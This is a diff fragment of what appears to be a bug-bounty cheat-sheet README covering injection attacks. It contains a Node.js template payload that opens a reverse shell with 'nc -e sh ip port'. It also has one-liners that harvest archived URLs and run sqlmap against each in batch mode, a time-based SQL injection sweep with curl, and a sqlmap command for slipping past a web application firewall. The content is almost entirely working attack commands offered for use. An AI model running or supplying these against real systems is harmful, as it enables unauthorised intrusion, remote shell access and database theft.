@@ -58,14 +58,18 @@ cat urls.txt | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' > asphpfile
 1-If you discover a node.js template area, you should try triggerable node payload </br>
 `require('child_process').exec('nc -e sh ip port');{src:/bin/sh/}`
 # SQLi
-sqlmap + waybackurls
+1-sqlmap + waybackurls
 ```
 waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"
 ```
-Time based + waybackurls
+2-Time based + waybackurls
 ```
 #waybackurls http://test.com | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt
 #cat urls.txt | sed 's/=/=(CASE%20WHEN%20(888=888)%20THEN%20SLEEP(5)%20ELSE%20888%20END)/g' | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && time curl "'{}'"
+```
+3-bypass waf
+```
+sqlmap -r req.txt --risk 3 --level 3 --dbs --tamper=space2comment,space2morehash
 ```
 # XSS
 1-The new reportError() function enables a quite amusing XSS vector:
